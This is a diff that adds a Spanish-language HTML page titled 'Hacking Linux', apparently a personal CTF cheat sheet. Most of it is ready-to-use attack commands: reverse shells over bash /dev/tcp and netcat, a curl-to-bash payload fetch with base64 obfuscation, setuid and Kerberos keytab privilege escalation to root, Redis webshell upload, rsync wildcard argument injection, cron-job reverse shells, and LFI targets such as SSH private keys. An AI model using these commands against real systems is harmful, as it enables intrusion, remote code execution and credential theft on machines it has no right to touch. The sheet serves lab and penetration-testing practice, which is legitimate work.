@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Hacking Easy</title>
+	<link rel="stylesheet" type="text/css" href="linux.css">
+</head>
+<body>
+	<header>
+		<h1>Hacking Linux</h1>
+		<nav>
+			<ul>
+				<li><a href="../index.html" style="color: red;"">Inicio</a></li>
+				<li><a href="#">Acerca de</a></li>
+				<li><a href="#">Contacto</a></li>
+			</ul>
+		</nav>
+	</header>
+	<main>
+		<article>
+			<h2></h2>
+			<p></p>
+			<p id="code"></p>
+		</article>
+		<article>
+			<h2>FUZZING</h2>
+			<p>Sin un mapa, nadie va a poder encontrar el tesoro</p>
+			<p id="code">gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2-3-medium.txt -t 100 -x php-reverse-shell<br>
+				gobuster vhost -u http://$machine.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/file.txt -t 100<br>
+				gobuster dns -d $machine.htb -w /usr/share/wordlists/seclists/Discovery/DNS/file.txt -t 100<br>
+			</p>
+		</article>
+		<article>
+			<h2>REVERSE SHELL</h2>
+			<p>Estas son diferentes formas de obtener una Reverse Shell:
+			<p id="code">bash -c 'bash -i >& /dev/tcp/$MP/1234 0>&1'<br>
+				rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $MP 1234 >/tmp/f
+			</p>
+			<p>Se puede meter este codigo dentro de un archivo, crear un python server y llamarlo con curl para luego invocarlo con bash</p>
+			<p id="code">echo "bash -c 'bash -i >& /dev/tcp/$MP/1234 0>&1" > reverse<br>
+				python3 -m http.server 80
+				<br>curl http://$MP/reverse | bash
+			</p>
+			<p>Si se necesita bypassearlo mucho más, se puede pasar a base64 e invocarlo con bash</p>
+			<p id="code">echo "bash -c 'bash -i >& /dev/tcp/$MP/1234 0>&1'" | base64 <br>
+				echo $BASE64OUTPUT | base64 -d | bash
+			</p>
+		</article>
+		<article>
+			<h2>OBTENER INFORMACIÓN DEL SISTEMA</h2>
+			<p>Los siguientes comandos son utiles para identificar un sistema luego de obtener una shell:</p>
+			<p id="code">whoami<br>id $USER<br>sudo -l<br>ps -faux<br>ps -eo command<br>lsb_release -a<br>history<br>hostname<br>hostnamectl<br>ifconfig<br>uname -a<br>cat /etc/hosts<br>cat /etc/crontab<br>getcap -r / 2>/dev/null<br>netstat -putona<br>mount | grep proc <br>uname -a -ls -l /var/log<br>find / -perm -4000 2>/dev/null<br>find / -user $USER 2>/dev/null | grep -vE "/proc|/run"</p>
+		</article>
+		<article>
+			<h2>SI NO ENCUENTRO NADA</h2>
+			<p>Aveces se necesitan otras herramientas como:</p>
+			<p id="code">linpeas.sh = Encontrar vulnerabilidades y archivos curiosos<br>
+				pspy = Ver procesos que ocurren en el momento y saber quién los ejecuta
+			</p>
+		</article>
+		<article>
+			<h2>SI TENGO LFI</h2>
+			<p>Estos son los archivos que deberías buscar si tenes un Local File Inclusion en una máquina Linux:</p>
+			<p id="code">/home/$USER/.ssh/id_rsa<br>/etc/passwd<br>/etc/hosts<br>/proc/self/cmdline</p>
+		</article>
+		<article>
+			<h2>ARCHIVOS CON PASSWORD</h2>
+			<p>John ocupa demasiados formatos, el proceso es el mismo con todos.</p>
+			<p id="code">ssh2john id_rsa > hash<br>
+				zip2jhon file.zip > hash<br>
+				pdf2john file.pdf > hash<br><br>
+				john --wordlist=/usr/share/wordlists/rockyou.txt hash
+			</p>
+		</article>
+		<article>
+			<h2>STENOGRAPHY</h2>
+			<p>El arte de ocultar cosas en los pequeños detalles que no se ven a simple vista.</p>
+			<p id="code">strings image.jpg<br>
+				exiftool image.jpg<br>
+				steghide info image.jpg<br>
+				steghide extract -sf image.jpg
+			</p>
+		</article>
+		<article>
+			<h2>PORT FORWARDING Y SOCAT</h2>
+			<p>Muchas veces es necesario tener conexión con un puerto interno el cual no tenemos acceso desde "afuera"</p>
+			<p id="code">ssh $USER@$IP -L 8080:172.17.0.2:8080<br><br>
+				chisel server --reverse --port 1234<br>
+				chisel client $MP:1234 R:8080:127.0.0.1:8080<br><br>
+				chisel server --reverse --port 1234<br>
+				chisel client $MP:1234 R:127.0.0.1:8080:sock5<br><br>
+				socat TCP-LISTEN:7777 stdout #Poner listener
+				socat TCP-LISTEN:1111,fork TCP:$MP:2222 & #Redirigir entrante
+			</p>
+		</article>
+		<article>
+			<h2>CAPABILITIES</h2>
+			<p>Si python3 tiene "cap_setuid_ep"</p>
+			<p id="code">python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</p>
+		</article>
+		<article>
+			<h2>SQUID PROXY (PORT 3128)</h2>
+			<p>Para trabajar con esto hay que modificar el file /etc/proxychains.conf y poner al final:"</p>
+			<p id="code">http $IP 3128<br>
+				proxychains -q nmap -sT -Pn -v -n 127.0.0.1<br>
+			</p>
+			<p>Si no tenemos conexión con otros IP's internos, entonces hay que pasar por la interfaz de SQUID Porxy nuevamente, agregamos lo siguiente en /etc/proxychains<br></p>
+			<p id="code">http 127.0.0.1 3128</p>
+			<p>Luego de esto habría que crear un scanPorts.sh usando el proxy para llegar a esas IP's</p>
+		</article>
+		<article>
+			<h2>KERBEROS IN LINUX</h2>
+			<p>Para detectar users validos:</p>
+			<p id="code">kerbrute userenum --dc $IP -d $DOMAIN users.txt</p>
+			<p>Si hacemos ssh y nos dá el error de "gssapi-with-mic"</p>
+			<p id="code">apt install krb5-user<br>
+				dpkg-reconfigure krb5-config (Poner $DOMAIN y $IP)<br><br>
+				#/etc/krb5.conf<br>
+				[libdefaults]<br>
+				&nbsp;&nbsp;&nbsp;&nbsp;default_realm = $DOMAIN<br>
+				[realms]<br>
+				&nbsp;&nbsp;&nbsp;&nbsp;$DOMAIN = {<br>
+				&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kdc = $KERBEROS.DOMAIN<br>
+				&nbsp;&nbsp;&nbsp;&nbsp;}<br>
+				[domain-realm]<br>
+				&nbsp;&nbsp;&nbsp;&nbsp;.$domain = $DOMAIN<br>
+				&nbsp;&nbsp;&nbsp;&nbsp;$DOMAIN = $DOMAIN<br>
+			</p>
+			<p>Y luego tienes que ejecutar los siguientes comandos para obtener una especie de key</p>
+			<p id="code">kinit $USER<br>
+				klist
+			</p>
+			<p>Ahora cuando intentes logearte con SSH, va a poder iniciar usando la autenticación de Kerberos<br><br>
+				Para poder cambiar de usuario, simplemente hay que agregar un file .k5login en el /home/$user y luego entrar con SSH, no nos va a pedir password como de la anterior forma.
+			</p>
+			<p id="code">echo '$user@$DOMAIN' > /home/$victim/.k5login</p>
+			<p>Si hay un 'krb5.keystab' legible entonces podemos hacer lo siguiente:</p>
+			<p id="code">klist -k /$PATH/krb5.keystab<br>
+				kadmin -kt /$PATH/krb5.keystab -p $PRINCIPLE<br>
+				> addprinc root@$DOMAIN #te pide crear contraseña<br>
+				> exit<br>
+				ksu #contraseña GG ROOT
+			</p>
+		</article>
+		<article>
+			<h2>SNMP</h2>
+			<p>Para empezar a enumerar el servicio SNMP, necesitamos de un COMMUNITY STRING, vamos a bruteforcearlo</p>
+			<p id="code">onesixtyone $IP -c /$SECLIST/Discovery/SNMP/Common-strings.txt #Dumpea "public"<br>
+				snmpwalk -v2c -c public $IP<br>
+				snmpwalk -v2c -c public $IP -p AddresType #Dumpea IPV6 (beef)<br><br>
+				nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n -6 $IPV6 -oG IPV6Ports
+			</p>
+			<p>Si nos encontramos con un HTTP que es un Python Server o otro proceso que seguramente se corrió en terminal, podemos enumerarlo!</p>
+			<p id="code">snmpwalk -v2c -c public $IP hrSWRunName | grep python #Dumpea "568"
+				snmapwalk -v2c -c public $IP hrSWRunTable | grep "568" #En este caso dumpea creds de Python Server para usar en POPUP LOGIN
+			</p>
+		</article>
+		<article>
+			<h2>REDIS (PORT 6379)</h2>
+			<p>Para obtener info del servicio:</p>
+			<p id="code">nc $IP 6379<br>
+				> INFO #Dumpea "db0:key=1" Quiere decir que solo hay una database<br>
+				> select 0<br>
+				> keys *<br>
+			</p>
+			<p>Para obtener RCE con Redis, vamos a probar subir un archivo php pero tiene que tener 3 saltos de lineas al principio y 2 a lo ultimo para que lo interprete bien</p>
+			<p id="code">cat cmd.php | redis-cli -h $IP -s set reverse #reverse es solo un nombre<br>
+				redis-cli -h $IP config set dir /var/www/html/<br>
+				redis-cli -h $IP config set dbfilename "cmd.php"
+				redis-cli -h $IP save
+			</p>
+		</article>
+		<article>
+			<h2>RSYNC RCE BYPASS Y PRIVILEGE ESCALATION</h2>
+			<p>Si se ejecuta "rsync *.rdb" entonces podemos crear un test.rdb con codigo bash y hacer lo siguiente:</p>
+			<p id="code">touch -- '-e sh test.rdb'</p>
+			<p>De esta forma, ambos arhivos terminan con .rdb y el '-e sh test.rdb' se termina usando como parametro y ejecuta al 'test.rdb' teniendo RCE como el user que ejecuta esta tarea</p>
+			<p>Ahora vamos a usar Rsync para crear un CronJob para obtener reverse shell</p>
+			<p id="code">rsync rsync://$IP/src/etc/passwd passwd #Getea /etc/passwd<br>
+				echo '* * * * * root sh /tmp/reverse.sh > reverse'<br>
+				rsync reverse rsync://$IP/src/etc/cron.d/reverse<br>
+			</p>
+			<p>Hacemos lo mismo para poner un reverse shell en /tmp/revershell.sh</p>
+		</article>
+		<article>
+			<h2>MOUNTING BACKUP</h2>
+			<p>Si hay un /backup en /dev/sda2 al escribir el comando 'df -h'</p>
+			<p id="code">mkdir /mnt/test<br>
+				mount /dev/sda2 /mnt/test<br>
+				#Creamos CronJob para obtener reverse shell con Perl
+			</p>
+		</article>
+		<article>
+			<h2></h2>
+			<p></p>
+			<p id="code"></p>
+		</article>
+		<article>
+			<h2></h2>
+			<p></p>
+			<p id="code"></p>
+		</article>
+		<article>
+			<h2></h2>
+			<p></p>
+			<p id="code"></p>
+		</article>
+	</main>
+	<footer>
+		<p>&copy; 2023 Hack Easy. Todos los derechos reservados.</p>
+	</footer>
+</body>
+</html>
